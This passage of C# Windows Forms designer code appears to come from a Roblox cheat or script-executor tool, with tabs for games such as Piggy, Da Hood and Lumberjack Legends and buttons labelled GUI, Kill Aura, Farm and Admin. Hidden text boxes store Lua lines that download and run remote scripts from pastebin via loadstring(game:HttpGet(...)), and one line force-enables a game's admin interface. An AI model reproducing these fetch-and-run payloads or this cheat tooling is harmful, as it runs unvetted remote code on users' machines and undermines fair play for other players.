            this.flatButton297.Size = new System.Drawing.Size(106, 35);
            this.flatButton297.TabIndex = 49;
            this.flatButton297.Text = "GUI";
            this.flatButton297.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton297.UseCustomColor = false;
            this.flatButton297.Click += new System.EventHandler(this.flatButton297_Click);
            // 
            // tabPage107
            // 
            this.tabPage107.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage107.Controls.Add(this.flatButton300);
            this.tabPage107.Controls.Add(this.pictureBox186);
            this.tabPage107.Controls.Add(this.flatButton301);
            this.tabPage107.Location = new System.Drawing.Point(4, 44);
            this.tabPage107.Name = "tabPage107";
            this.tabPage107.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage107.Size = new System.Drawing.Size(514, 249);
            this.tabPage107.TabIndex = 102;
            this.tabPage107.Text = "Army Tycoon";
            // 
            // flatButton300
            // 
            this.flatButton300.BackColor = System.Drawing.Color.Transparent;
            this.flatButton300.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton300.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton300.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton300.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton300.Location = new System.Drawing.Point(557, 369);
            this.flatButton300.Name = "flatButton300";
            this.flatButton300.Rounded = false;
            this.flatButton300.Size = new System.Drawing.Size(106, 35);
            this.flatButton300.TabIndex = 59;
            this.flatButton300.Text = "Home";
            this.flatButton300.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton300.UseCustomColor = false;
            this.flatButton300.Click += new System.EventHandler(this.flatButton300_Click);
            // 
            // pictureBox186
            // 
            this.pictureBox186.Location = new System.Drawing.Point(514, 6);
            this.pictureBox186.Name = "pictureBox186";
            this.pictureBox186.Size = new System.Drawing.Size(149, 149);
            this.pictureBox186.TabIndex = 58;
            this.pictureBox186.TabStop = false;
            // 
            // flatButton301
            // 
            this.flatButton301.BackColor = System.Drawing.Color.Transparent;
            this.flatButton301.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton301.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton301.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton301.Location = new System.Drawing.Point(6, 6);
            this.flatButton301.Name = "flatButton301";
            this.flatButton301.Rounded = false;
            this.flatButton301.Size = new System.Drawing.Size(106, 35);
            this.flatButton301.TabIndex = 57;
            this.flatButton301.Text = "GUI";
            this.flatButton301.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton301.UseCustomColor = false;
            this.flatButton301.Click += new System.EventHandler(this.flatButton301_Click);
            // 
            // tabPage108
            // 
            this.tabPage108.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage108.Controls.Add(this.flatButton302);
            this.tabPage108.Controls.Add(this.pictureBox187);
            this.tabPage108.Controls.Add(this.flatButton303);
            this.tabPage108.Location = new System.Drawing.Point(4, 44);
            this.tabPage108.Name = "tabPage108";
            this.tabPage108.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage108.Size = new System.Drawing.Size(514, 249);
            this.tabPage108.TabIndex = 103;
            this.tabPage108.Text = "Da Hood";
            // 
            // flatButton302
            // 
            this.flatButton302.BackColor = System.Drawing.Color.Transparent;
            this.flatButton302.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton302.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton302.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton302.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton302.Location = new System.Drawing.Point(557, 369);
            this.flatButton302.Name = "flatButton302";
            this.flatButton302.Rounded = false;
            this.flatButton302.Size = new System.Drawing.Size(106, 35);
            this.flatButton302.TabIndex = 62;
            this.flatButton302.Text = "Home";
            this.flatButton302.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton302.UseCustomColor = false;
            this.flatButton302.Click += new System.EventHandler(this.flatButton302_Click);
            // 
            // pictureBox187
            // 
            this.pictureBox187.Location = new System.Drawing.Point(514, 6);
            this.pictureBox187.Name = "pictureBox187";
            this.pictureBox187.Size = new System.Drawing.Size(149, 149);
            this.pictureBox187.TabIndex = 61;
            this.pictureBox187.TabStop = false;
            // 
            // flatButton303
            // 
            this.flatButton303.BackColor = System.Drawing.Color.Transparent;
            this.flatButton303.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton303.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton303.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton303.Location = new System.Drawing.Point(6, 6);
            this.flatButton303.Name = "flatButton303";
            this.flatButton303.Rounded = false;
            this.flatButton303.Size = new System.Drawing.Size(106, 35);
            this.flatButton303.TabIndex = 60;
            this.flatButton303.Text = "GUI";
            this.flatButton303.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton303.UseCustomColor = false;
            this.flatButton303.Click += new System.EventHandler(this.flatButton303_Click);
            // 
            // tabPage110
            // 
            this.tabPage110.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage110.Controls.Add(this.flatButton314);
            this.tabPage110.Controls.Add(this.pictureBox196);
            this.tabPage110.Controls.Add(this.flatButton315);
            this.tabPage110.Location = new System.Drawing.Point(4, 44);
            this.tabPage110.Name = "tabPage110";
            this.tabPage110.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage110.Size = new System.Drawing.Size(514, 249);
            this.tabPage110.TabIndex = 105;
            this.tabPage110.Text = "Rogue Liniage";
            // 
            // flatButton314
            // 
            this.flatButton314.BackColor = System.Drawing.Color.Transparent;
            this.flatButton314.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton314.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton314.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton314.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton314.Location = new System.Drawing.Point(557, 369);
            this.flatButton314.Name = "flatButton314";
            this.flatButton314.Rounded = false;
            this.flatButton314.Size = new System.Drawing.Size(106, 35);
            this.flatButton314.TabIndex = 23;
            this.flatButton314.Text = "Home";
            this.flatButton314.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton314.UseCustomColor = false;
            this.flatButton314.Click += new System.EventHandler(this.flatButton314_Click);
            // 
            // pictureBox196
            // 
            this.pictureBox196.Location = new System.Drawing.Point(514, 6);
            this.pictureBox196.Name = "pictureBox196";
            this.pictureBox196.Size = new System.Drawing.Size(149, 149);
            this.pictureBox196.TabIndex = 22;
            this.pictureBox196.TabStop = false;
            // 
            // flatButton315
            // 
            this.flatButton315.BackColor = System.Drawing.Color.Transparent;
            this.flatButton315.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton315.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton315.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton315.Location = new System.Drawing.Point(6, 6);
            this.flatButton315.Name = "flatButton315";
            this.flatButton315.Rounded = false;
            this.flatButton315.Size = new System.Drawing.Size(106, 35);
            this.flatButton315.TabIndex = 21;
            this.flatButton315.Text = "GUI";
            this.flatButton315.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton315.UseCustomColor = false;
            this.flatButton315.Click += new System.EventHandler(this.flatButton315_Click);
            // 
            // tabPage111
            // 
            this.tabPage111.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage111.Controls.Add(this.flatButton316);
            this.tabPage111.Controls.Add(this.pictureBox197);
            this.tabPage111.Controls.Add(this.flatButton317);
            this.tabPage111.Location = new System.Drawing.Point(4, 44);
            this.tabPage111.Name = "tabPage111";
            this.tabPage111.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage111.Size = new System.Drawing.Size(514, 249);
            this.tabPage111.TabIndex = 106;
            this.tabPage111.Text = "Illum 2";
            // 
            // flatButton316
            // 
            this.flatButton316.BackColor = System.Drawing.Color.Transparent;
            this.flatButton316.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton316.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton316.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton316.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton316.Location = new System.Drawing.Point(557, 369);
            this.flatButton316.Name = "flatButton316";
            this.flatButton316.Rounded = false;
            this.flatButton316.Size = new System.Drawing.Size(106, 35);
            this.flatButton316.TabIndex = 26;
            this.flatButton316.Text = "Home";
            this.flatButton316.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton316.UseCustomColor = false;
            this.flatButton316.Click += new System.EventHandler(this.flatButton316_Click);
            // 
            // pictureBox197
            // 
            this.pictureBox197.Location = new System.Drawing.Point(514, 6);
            this.pictureBox197.Name = "pictureBox197";
            this.pictureBox197.Size = new System.Drawing.Size(149, 149);
            this.pictureBox197.TabIndex = 25;
            this.pictureBox197.TabStop = false;
            // 
            // flatButton317
            // 
            this.flatButton317.BackColor = System.Drawing.Color.Transparent;
            this.flatButton317.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton317.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton317.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton317.Location = new System.Drawing.Point(6, 6);
            this.flatButton317.Name = "flatButton317";
            this.flatButton317.Rounded = false;
            this.flatButton317.Size = new System.Drawing.Size(106, 35);
            this.flatButton317.TabIndex = 24;
            this.flatButton317.Text = "GUI";
            this.flatButton317.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton317.UseCustomColor = false;
            this.flatButton317.Click += new System.EventHandler(this.flatButton317_Click);
            // 
            // tabPage112
            // 
            this.tabPage112.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage112.Controls.Add(this.flatButton318);
            this.tabPage112.Controls.Add(this.pictureBox198);
            this.tabPage112.Controls.Add(this.flatButton319);
            this.tabPage112.Location = new System.Drawing.Point(4, 44);
            this.tabPage112.Name = "tabPage112";
            this.tabPage112.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage112.Size = new System.Drawing.Size(514, 249);
            this.tabPage112.TabIndex = 107;
            this.tabPage112.Text = "Giant Survival";
            // 
            // flatButton318
            // 
            this.flatButton318.BackColor = System.Drawing.Color.Transparent;
            this.flatButton318.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton318.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton318.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton318.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton318.Location = new System.Drawing.Point(557, 369);
            this.flatButton318.Name = "flatButton318";
            this.flatButton318.Rounded = false;
            this.flatButton318.Size = new System.Drawing.Size(106, 35);
            this.flatButton318.TabIndex = 29;
            this.flatButton318.Text = "Home";
            this.flatButton318.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton318.UseCustomColor = false;
            this.flatButton318.Click += new System.EventHandler(this.flatButton318_Click);
            // 
            // pictureBox198
            // 
            this.pictureBox198.Location = new System.Drawing.Point(514, 6);
            this.pictureBox198.Name = "pictureBox198";
            this.pictureBox198.Size = new System.Drawing.Size(149, 149);
            this.pictureBox198.TabIndex = 28;
            this.pictureBox198.TabStop = false;
            // 
            // flatButton319
            // 
            this.flatButton319.BackColor = System.Drawing.Color.Transparent;
            this.flatButton319.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton319.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton319.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton319.Location = new System.Drawing.Point(6, 6);
            this.flatButton319.Name = "flatButton319";
            this.flatButton319.Rounded = false;
            this.flatButton319.Size = new System.Drawing.Size(106, 35);
            this.flatButton319.TabIndex = 27;
            this.flatButton319.Text = "Farm";
            this.flatButton319.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton319.UseCustomColor = false;
            this.flatButton319.Click += new System.EventHandler(this.flatButton319_Click);
            // 
            // tabPage113
            // 
            this.tabPage113.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage113.Controls.Add(this.richTextBox6);
            this.tabPage113.Controls.Add(this.flatButton320);
            this.tabPage113.Controls.Add(this.pictureBox199);
            this.tabPage113.Controls.Add(this.flatButton321);
            this.tabPage113.Location = new System.Drawing.Point(4, 44);
            this.tabPage113.Name = "tabPage113";
            this.tabPage113.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage113.Size = new System.Drawing.Size(514, 249);
            this.tabPage113.TabIndex = 108;
            this.tabPage113.Text = "Breaking Point";
            // 
            // richTextBox6
            // 
            this.richTextBox6.Location = new System.Drawing.Point(5, 47);
            this.richTextBox6.Name = "richTextBox6";
            this.richTextBox6.Size = new System.Drawing.Size(106, 143);
            this.richTextBox6.TabIndex = 30;
            this.richTextBox6.Text = "loadstring(game:HttpGet(\'https://pastebin.com/raw/MLPypHYv\', true))()\n";
            this.richTextBox6.Visible = false;
            // 
            // flatButton320
            // 
            this.flatButton320.BackColor = System.Drawing.Color.Transparent;
            this.flatButton320.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton320.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton320.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton320.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton320.Location = new System.Drawing.Point(557, 369);
            this.flatButton320.Name = "flatButton320";
            this.flatButton320.Rounded = false;
            this.flatButton320.Size = new System.Drawing.Size(106, 35);
            this.flatButton320.TabIndex = 29;
            this.flatButton320.Text = "Home";
            this.flatButton320.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton320.UseCustomColor = false;
            this.flatButton320.Click += new System.EventHandler(this.flatButton320_Click);
            // 
            // pictureBox199
            // 
            this.pictureBox199.Location = new System.Drawing.Point(514, 6);
            this.pictureBox199.Name = "pictureBox199";
            this.pictureBox199.Size = new System.Drawing.Size(149, 149);
            this.pictureBox199.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox199.TabIndex = 28;
            this.pictureBox199.TabStop = false;
            // 
            // flatButton321
            // 
            this.flatButton321.BackColor = System.Drawing.Color.Transparent;
            this.flatButton321.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton321.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton321.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton321.Location = new System.Drawing.Point(6, 6);
            this.flatButton321.Name = "flatButton321";
            this.flatButton321.Rounded = false;
            this.flatButton321.Size = new System.Drawing.Size(106, 35);
            this.flatButton321.TabIndex = 27;
            this.flatButton321.Text = "GUI";
            this.flatButton321.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton321.UseCustomColor = false;
            this.flatButton321.Click += new System.EventHandler(this.flatButton321_Click);
            // 
            // tabPage117
            // 
            this.tabPage117.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage117.Controls.Add(this.richTextBox105);
            this.tabPage117.Controls.Add(this.flatButton446);
            this.tabPage117.Controls.Add(this.flatButton334);
            this.tabPage117.Controls.Add(this.pictureBox210);
            this.tabPage117.Location = new System.Drawing.Point(4, 44);
            this.tabPage117.Name = "tabPage117";
            this.tabPage117.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage117.Size = new System.Drawing.Size(514, 249);
            this.tabPage117.TabIndex = 112;
            this.tabPage117.Text = "Piggy";
            // 
            // richTextBox105
            // 
            this.richTextBox105.Location = new System.Drawing.Point(6, 50);
            this.richTextBox105.Name = "richTextBox105";
            this.richTextBox105.Size = new System.Drawing.Size(106, 178);
            this.richTextBox105.TabIndex = 26;
            this.richTextBox105.Text = "loadstring(game:HttpGet(\'https://pastebin.com/raw/zg8USDEv\', true))()\n";
            this.richTextBox105.Visible = false;
            // 
            // flatButton446
            // 
            this.flatButton446.BackColor = System.Drawing.Color.Transparent;
            this.flatButton446.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton446.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton446.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton446.Location = new System.Drawing.Point(6, 9);
            this.flatButton446.Name = "flatButton446";
            this.flatButton446.Rounded = false;
            this.flatButton446.Size = new System.Drawing.Size(106, 35);
            this.flatButton446.TabIndex = 25;
            this.flatButton446.Text = "GUI";
            this.flatButton446.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton446.UseCustomColor = false;
            this.flatButton446.Click += new System.EventHandler(this.flatButton446_Click);
            // 
            // flatButton334
            // 
            this.flatButton334.BackColor = System.Drawing.Color.Transparent;
            this.flatButton334.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton334.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton334.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton334.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton334.Location = new System.Drawing.Point(557, 369);
            this.flatButton334.Name = "flatButton334";
            this.flatButton334.Rounded = false;
            this.flatButton334.Size = new System.Drawing.Size(106, 35);
            this.flatButton334.TabIndex = 24;
            this.flatButton334.Text = "Home";
            this.flatButton334.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton334.UseCustomColor = false;
            this.flatButton334.Click += new System.EventHandler(this.flatButton334_Click);
            // 
            // pictureBox210
            // 
            this.pictureBox210.Location = new System.Drawing.Point(514, 6);
            this.pictureBox210.Name = "pictureBox210";
            this.pictureBox210.Size = new System.Drawing.Size(149, 149);
            this.pictureBox210.TabIndex = 23;
            this.pictureBox210.TabStop = false;
            // 
            // tabPage119
            // 
            this.tabPage119.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage119.Controls.Add(this.flatButton338);
            this.tabPage119.Controls.Add(this.pictureBox212);
            this.tabPage119.Controls.Add(this.flatButton339);
            this.tabPage119.Location = new System.Drawing.Point(4, 44);
            this.tabPage119.Name = "tabPage119";
            this.tabPage119.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage119.Size = new System.Drawing.Size(514, 249);
            this.tabPage119.TabIndex = 114;
            this.tabPage119.Text = "Giant Simulator";
            // 
            // flatButton338
            // 
            this.flatButton338.BackColor = System.Drawing.Color.Transparent;
            this.flatButton338.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton338.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton338.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton338.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton338.Location = new System.Drawing.Point(557, 369);
            this.flatButton338.Name = "flatButton338";
            this.flatButton338.Rounded = false;
            this.flatButton338.Size = new System.Drawing.Size(106, 35);
            this.flatButton338.TabIndex = 32;
            this.flatButton338.Text = "Home";
            this.flatButton338.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton338.UseCustomColor = false;
            this.flatButton338.Click += new System.EventHandler(this.flatButton338_Click);
            // 
            // pictureBox212
            // 
            this.pictureBox212.Location = new System.Drawing.Point(514, 6);
            this.pictureBox212.Name = "pictureBox212";
            this.pictureBox212.Size = new System.Drawing.Size(149, 149);
            this.pictureBox212.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox212.TabIndex = 31;
            this.pictureBox212.TabStop = false;
            // 
            // flatButton339
            // 
            this.flatButton339.BackColor = System.Drawing.Color.Transparent;
            this.flatButton339.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton339.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton339.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton339.Location = new System.Drawing.Point(6, 6);
            this.flatButton339.Name = "flatButton339";
            this.flatButton339.Rounded = false;
            this.flatButton339.Size = new System.Drawing.Size(106, 35);
            this.flatButton339.TabIndex = 29;
            this.flatButton339.Text = "GUI";
            this.flatButton339.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton339.UseCustomColor = false;
            this.flatButton339.Click += new System.EventHandler(this.flatButton339_Click);
            // 
            // tabPage120
            // 
            this.tabPage120.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage120.Controls.Add(this.flatButton417);
            this.tabPage120.Controls.Add(this.flatButton340);
            this.tabPage120.Controls.Add(this.pictureBox213);
            this.tabPage120.Controls.Add(this.flatButton341);
            this.tabPage120.Location = new System.Drawing.Point(4, 44);
            this.tabPage120.Name = "tabPage120";
            this.tabPage120.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage120.Size = new System.Drawing.Size(514, 249);
            this.tabPage120.TabIndex = 115;
            this.tabPage120.Text = "A Bizzare Day";
            // 
            // flatButton417
            // 
            this.flatButton417.BackColor = System.Drawing.Color.Transparent;
            this.flatButton417.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton417.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton417.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton417.Location = new System.Drawing.Point(118, 6);
            this.flatButton417.Name = "flatButton417";
            this.flatButton417.Rounded = false;
            this.flatButton417.Size = new System.Drawing.Size(106, 35);
            this.flatButton417.TabIndex = 36;
            this.flatButton417.Text = "GUI";
            this.flatButton417.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton417.UseCustomColor = false;
            this.flatButton417.Click += new System.EventHandler(this.flatButton417_Click);
            // 
            // flatButton340
            // 
            this.flatButton340.BackColor = System.Drawing.Color.Transparent;
            this.flatButton340.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton340.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton340.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton340.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton340.Location = new System.Drawing.Point(557, 369);
            this.flatButton340.Name = "flatButton340";
            this.flatButton340.Rounded = false;
            this.flatButton340.Size = new System.Drawing.Size(106, 35);
            this.flatButton340.TabIndex = 35;
            this.flatButton340.Text = "Home";
            this.flatButton340.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton340.UseCustomColor = false;
            this.flatButton340.Click += new System.EventHandler(this.flatButton340_Click);
            // 
            // pictureBox213
            // 
            this.pictureBox213.Location = new System.Drawing.Point(514, 6);
            this.pictureBox213.Name = "pictureBox213";
            this.pictureBox213.Size = new System.Drawing.Size(149, 149);
            this.pictureBox213.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox213.TabIndex = 34;
            this.pictureBox213.TabStop = false;
            // 
            // flatButton341
            // 
            this.flatButton341.BackColor = System.Drawing.Color.Transparent;
            this.flatButton341.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton341.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton341.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton341.Location = new System.Drawing.Point(6, 6);
            this.flatButton341.Name = "flatButton341";
            this.flatButton341.Rounded = false;
            this.flatButton341.Size = new System.Drawing.Size(106, 35);
            this.flatButton341.TabIndex = 33;
            this.flatButton341.Text = "Kill Aura";
            this.flatButton341.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton341.UseCustomColor = false;
            this.flatButton341.Click += new System.EventHandler(this.flatButton341_Click);
            // 
            // tabPage122
            // 
            this.tabPage122.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage122.Controls.Add(this.flatButton344);
            this.tabPage122.Controls.Add(this.pictureBox215);
            this.tabPage122.Controls.Add(this.richTextBox84);
            this.tabPage122.Controls.Add(this.flatButton345);
            this.tabPage122.Location = new System.Drawing.Point(4, 44);
            this.tabPage122.Name = "tabPage122";
            this.tabPage122.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage122.Size = new System.Drawing.Size(514, 249);
            this.tabPage122.TabIndex = 117;
            this.tabPage122.Text = "Lumberjack Legends";
            // 
            // flatButton344
            // 
            this.flatButton344.BackColor = System.Drawing.Color.Transparent;
            this.flatButton344.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton344.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton344.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton344.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton344.Location = new System.Drawing.Point(557, 369);
            this.flatButton344.Name = "flatButton344";
            this.flatButton344.Rounded = false;
            this.flatButton344.Size = new System.Drawing.Size(106, 35);
            this.flatButton344.TabIndex = 36;
            this.flatButton344.Text = "Home";
            this.flatButton344.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton344.UseCustomColor = false;
            this.flatButton344.Click += new System.EventHandler(this.flatButton344_Click);
            // 
            // pictureBox215
            // 
            this.pictureBox215.Location = new System.Drawing.Point(514, 6);
            this.pictureBox215.Name = "pictureBox215";
            this.pictureBox215.Size = new System.Drawing.Size(149, 149);
            this.pictureBox215.TabIndex = 35;
            this.pictureBox215.TabStop = false;
            // 
            // richTextBox84
            // 
            this.richTextBox84.Location = new System.Drawing.Point(6, 47);
            this.richTextBox84.Name = "richTextBox84";
            this.richTextBox84.Size = new System.Drawing.Size(106, 178);
            this.richTextBox84.TabIndex = 34;
            this.richTextBox84.Text = "game.Players.LocalPlayer.PlayerGui.AdminGui.Enabled = true";
            this.richTextBox84.Visible = false;
            // 
            // flatButton345
            // 
            this.flatButton345.BackColor = System.Drawing.Color.Transparent;
            this.flatButton345.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton345.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton345.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton345.Location = new System.Drawing.Point(6, 6);
            this.flatButton345.Name = "flatButton345";
            this.flatButton345.Rounded = false;
            this.flatButton345.Size = new System.Drawing.Size(106, 35);
            this.flatButton345.TabIndex = 33;
            this.flatButton345.Text = "Admin";
            this.flatButton345.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton345.UseCustomColor = false;
            this.flatButton345.Click += new System.EventHandler(this.flatButton345_Click);
            // 
            // tabPage124
            // 
            this.tabPage124.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage124.Controls.Add(this.flatButton348);
            this.tabPage124.Controls.Add(this.pictureBox217);
            this.tabPage124.Controls.Add(this.richTextBox86);
            this.tabPage124.Controls.Add(this.flatButton349);
            this.tabPage124.Location = new System.Drawing.Point(4, 44);
            this.tabPage124.Name = "tabPage124";
            this.tabPage124.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage124.Size = new System.Drawing.Size(514, 249);
            this.tabPage124.TabIndex = 119;
            this.tabPage124.Text = "Kick Off";
            // 
            // flatButton348
            // 
            this.flatButton348.BackColor = System.Drawing.Color.Transparent;
            this.flatButton348.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton348.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton348.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton348.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton348.Location = new System.Drawing.Point(557, 369);
            this.flatButton348.Name = "flatButton348";
            this.flatButton348.Rounded = false;
            this.flatButton348.Size = new System.Drawing.Size(106, 35);
            this.flatButton348.TabIndex = 44;
            this.flatButton348.Text = "Home";
